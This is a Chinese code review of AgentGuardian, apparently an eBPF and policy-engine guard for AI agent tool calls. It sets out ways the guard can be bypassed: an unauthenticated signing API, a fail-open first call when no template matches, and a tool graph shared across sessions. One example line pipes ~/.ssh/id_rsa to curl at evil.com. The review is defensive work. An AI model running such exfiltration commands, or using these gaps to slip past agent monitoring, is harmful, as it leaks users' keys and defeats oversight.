# AgentGuardian 代码复查报告

复查方式：逐文件阅读源码 + 在 Windows(MinGW gcc) 与 WSL2 Ubuntu-24.04 上执行复现脚本。
复查范围：`src/engine/`、`src/ebpf/`、`src/causal_guardian/`、`src/frida/`、`tests/`、`config/`、`pyproject.toml`。
前置结论：L1 链路存在 4 处断点（此前已确认 3 处，本次新增 1 处），即使修好，L3 侧仍有 4 个 P0 级设计缺陷。

---

## 一、P0：功能不成立 / 防护可被旁路

### P0-1　引擎 HTTP API 完全没有认证

**证据**
- `server.py:380` `POST /api/v1/causal-id/sign`：`pid` 与 `tool_name` 全部取自请求体，签名后返回合法通行证。
- `server.py:611` `PUT /api/v1/config/task-templates`：可改写模板、工具图、全局黑名单。
- 全文无 `Depends`、无 API Key、无 peer 凭据校验；`/ws/events` 同样无鉴权。

**后果**
任何能访问 `127.0.0.1:8000` 的本地进程都可以：
1. 拿任意 PID 换通行证 —— 目标进程的 syscall 会被放行（**"零信任"直接失效**）；
2. 改安全策略 —— 把黑名单清空、给模板加一条万能边，让后续判定一律 ALLOW；
3. 订阅全部事件 —— 拿到 pid、拦截原因、污点状态。

**修法**
- 引擎与 bridge 之间加共享密钥（`/etc/agent-guardian/engine.token`），所有 `/api/v1/*` 走 `Depends` 校验，`/ws/events` 用同一 token 做握手；
- **关键**：`pid` 不要信请求体。签名端点改成用连接的 peer 凭据（Unix socket + `SO_PEERCRED`，或 HTTP 走本机 + 绑定 token 到 pid）确定 pid；否则伪造 pid 的口子永远开着；
- `PUT /config/*` 与 `/ebpf/intercept` 只允许 root 或 loopback+token。

---

### P0-2　启动时不推送初始 session_key（第 4 处 L1 断点）

**证据**
- `key_manager.initialize()`（`key_manager.py:70-87`）派生 active key 后**只返回、不推送**；
- `_send_key_update()` 仅在 `rotate()`（`key_manager.py:100`）里被调用；
- `server.py:301` 的 `_rotate_keys()` 第一步是 `await asyncio.sleep(30)`。

**后果**
引擎启动后的前 30 秒，BPF `session_key` map 仍是全零（ARRAY map 默认值）。guardian 读到的 active_key 是 32 个 0，验签必失败 → `status=2` → 注册被拒 → 内核查不到票 → SIGKILL。
再加上此前三处（时间戳未传递、key 空间不一致、时钟基准不一致），**L1 链路一共 4 处断点，任一处都足以让它完全不可用**。

**修法**
`initialize()` 之后立刻 `_send_key_update(keys.active, b"")`；并把首次推送失败视为致命错误（L1 不可用时要显式报警，而不是静默降级）。

---

### P0-3　模板匹配失败 = 第一个工具调用无条件放行

**证据**
- `graph_constraint.py:81-85`：`prev_tool is None`（会话首次调用）→ 无污点直接 `Decision.ALLOW`；
- 模板未命中时 `load_template` 从未被调用，`_graph` 为空 `{}`；
- `template_matcher.match()` 在标签不命中且 MinHash < 0.60 时返回 `(None, "none")`（`template_matcher.py:82`）。

**后果**
任何没被模板匹配上的会话，**第一次工具调用必然 ALLOW 并签发通行证**。攻击者只需把窃取动作塞进一次调用（例如一个 `bash` 工具执行 `cat ~/.ssh/id_rsa | curl -d @- evil.com`），就绕过了整张工具调用图。

**修法**
`_graph` 为空（即"没有可用策略"）时默认 **BLOCK/ASK**，而不是 ALLOW；入口节点也应要求"该工具在当前模板的节点集合内"。

---

### P0-4　工具调用图是全局单例，会被各会话互相覆盖

**证据**
- `server.py:396` `state.graph_constraint.load_template(template)` —— `state.graph_constraint` 是单例；
- `graph_constraint.py:44-51` `load_template` 直接替换 `self._graph`；
- 但 `_session_paths` 是**按会话**存的（`graph_constraint.py:37`），模板却是全局的。

**后果**
A 会话在跑 `resume_summary`（允许 read_file→summarize→send_email），B 会话在跑 `db_query_optimization`。B 一进来就把图换成数据库那套，A 的后续调用会按错误的图判定 —— 既可能误放（安全失效），也可能误杀（可用性失效）。这是并发下的确定性错误，不是偶发。

**修法**
`GraphConstraint` 按 `session_id` 持有模板：`self._graphs[session_id] = template`，`check()` 用本会话的图；模板为空时走 P0-3 的 fail-closed 分支。

---

## 二、P1：逻辑缺陷与可观测性失真

### P1-5　"UNVERIFIED 降级票"是死代码

`bridge.py:147,180,182` 在拿不到真票时返回 `UNVERIFIED_xxx` 字符串给 JS，但**从不把它注册进 map**；guardian 只接受 HMAC 验签通过的注册（`main.c:86-91`）。
因此内核侧 `entry->flags & CAUSAL_FLAG_UNVERIFIED`（`.bpf.c:81,179,246…`）**永远为 0**，`ALERT_UNVERIFIED_BLOCK` 分支不可达。
→ 文档里"审计引擎无法决策时允许继续但标记"的能力实际不存在，行为等价于"一律阻断"。要么实现它（guardian 提供一条不验签但只置 flag 的注册路径），要么删掉这段死代码，别在文档里承诺。

### P1-6　统计指标是编的

- `server.py:487` `interval_ms = 100.0 if call_count > 1 else 0.0` —— 调用间隔是硬编码常数，不是实测；
- `stats_baseline.py:70` `entropy_heuristic_upper = entropy * 1.5` —— 上界也是乘出来的。

→ 大屏上的 `interval_p95_ms`、`entropy_heuristic_upper` 没有任何信息量。改成记录真实的 `now - last_call_ts`，或者直接从大屏撤掉这两个指标（挂一个假指标比不挂更糟，尤其当老师问"这个 p95 怎么算的"）。

### P1-7　限流以 session_id 为键，且字典无上限

`server.py:360-377`：key 是 `req.session_id`（客户端自填）→ 换 id 即绕过；`_rate_buckets` 无 TTL、无容量上限 → 长时间运行内存单调增长。
修法：按 peer 身份/连接限流；桶加 TTL 淘汰。

### P1-8　monitored_tgid 被 chmod 0666

`loader.c:223` `chmod(MAP_PIN_DIR "/monitored_tgid", 0666)`。
任何本地用户都能把**任意 PID** 写进监控名单。被加入者接下来所有 `execve/openat(写)/connect/sendto/chmod(+x)` 都会因无票被 SIGKILL —— 这等于给这台机器提供了一个"一键杀任意进程"的本地 DoS。
修法：改成 0600，由一个受信任的管理接口（带认证）来增删监控对象。

### P1-9　bridge 的 100ms 硬超时 + 超时语义是 allow

`bridge.py:60` `timeout=0.1`；`bridge.py:74-76` 超时返回 `{"decision": "allow", ...}`。
虽然最终因为没有真票会被内核杀掉，但"决策层超时就返回 allow"是错误的默认值 —— 后续任何人把 UNVERIFIED 实现成"放行"，这里立刻变成真实漏洞。改成 `"block"` 或显式的 `"degrade"` 语义。

### P1-10　WebSocket 无鉴权

`server.py:523-530`：任何人可连 `/ws/events` 拿到全部事件流。与 P0-1 一起修。

### P1-11　集成测试的断言错位（这是前面几个 bug 活下来的原因）

`tests/integration/test_ebpf_chain.py`：
- `test_register_and_allow`（:106-113）**只断言 `status == 0`**，即"guardian 收下了"，从不验证"注册之后 eBPF 真的放行"；
- 所有"存活"断言都落在**不经过票据检查**的路径上：只读 open（:164）、chmod 不加执行位（:216）、AF_UNIX sendto（:235）、白名单二进制（:261）；
- 测试自己用的也是纯 PID（`_make_causal_id(os.getpid(), ...)`）和墙上时钟（`int(time.time()*1e9)`），与实现同步错，所以互相"验过"了。

**缺少的那条断言恰好就是能抓住 P0-2/P0-3/P0-4 和此前三处断点的那条**：
> 注册一个合法票据 → 执行一个**非白名单**的二进制 → 断言 `returncode == 0`。

补上这一条，这套测试才有意义。

---

## 三、P2：健壮性与工程质量

| # | 问题 | 位置 | 修法 |
|---|---|---|---|
| 12 | 单次 `recv(MSG_DONTWAIT)`，无长度校验、无粘包处理 | `main.c:252` | 按 `type` 字段读固定长度，循环读满；STREAM socket 必须处理短读 |
| 13 | SQL 特判只挂在 3 个工具名上 | `server.py:410` | 判定依据改为"参数形态/是否含 SQL 语句"，别信工具名 |
| 14 | master key 末尾换行启发式脆弱；state 每 30s 写盘 | `key_manager.py:75-86` | 显式约定密钥文件为原始 32 字节二进制；状态落内存，退出时写 |
| 15 | 依赖打包混乱：`onnxruntime` 硬依赖但可选；`transformers` 未声明却被 import；`flask/pillow/pypdf2/fpdf2` 是攻击样例用 | `pyproject.toml`、`slm_reviewer.py:41` | SLM 相关进 optional-dependencies；攻击样例依赖进 dev |
| 16 | 无 LICENSE、单 commit、无 CI | 仓库根 | 加 MIT/Apache-2.0；CI 跑 ruff+pytest，并加一个 ubuntu runner 上的 eBPF job（runner 有 root） |
| 17 | 相对路径加载 JS；`session_system_prompts` 无上限 | `bridge.py:196`、`server.py:187` | 基于 `__file__` 取路径；该 dict 换 `_TtlCache` |

---

## 四、这些不是 bug（别乱改）

- **`bpf_send_signal(9)` 硬杀进程**：这是 fail-closed 的必然代价。要改只能改产品形态（先 ASK 人工审批再杀），不是代码缺陷。
- **`openat` 只拦写、`chmod` 只拦加执行位、跳过 AF_UNIX**：降噪的正确取舍，改宽了反而不可用。
- **规则引擎弱**（`rule_engine.py` 已自陈 4 类盲区）、**污点是会话级**（ROADMAP 已列 P1）：属于已认知的边界，不是隐性缺陷。
- **`sendto` 目标未知时 fail-closed**：安全上正确。

---

## 五、修复优先级（按"性价比"排）

**Step 1（半天，先让系统成立）**
1. 启动时推送初始 key（P0-2）—— 两行；
2. 修三处已复现的 L1 断点（时间戳传递 / key 用 tgid / 单调时钟）；
3. 补那条缺失的断言（P1-11）：注册后执行非白名单二进制应存活；
4. 模板为空时 fail-closed（P0-3）—— 三行。

**Step 2（1–2 天，能对外讲）**
5. 引擎加认证 + pid 不信请求体（P0-1）；
6. 图约束改为 per-session（P0-4）；
7. 删掉假统计或改成实测（P1-6）；
8. monitored_tgid 改 0600（P1-8）。

**Step 3（工程化）**
9. CI + LICENSE + 依赖整理；
10. 限流、WebSocket 鉴权、粘包处理等 P2。

---

## 六、一句话总结（面试可以说）

> "这个项目 L3/L4（审计引擎 + 可视化）是完整的，160 个测试覆盖；但 L1（eBPF 内核层）从未真正跑通——我复查后发现 4 处接口级断点，以及测试断言本身验错了对象。我正在按优先级修：先让链路成立，再补认证和会话隔离。"

这句话比"我做了四层防线"可信得多，而且它把"我读过自己的代码"这件事证明死了。
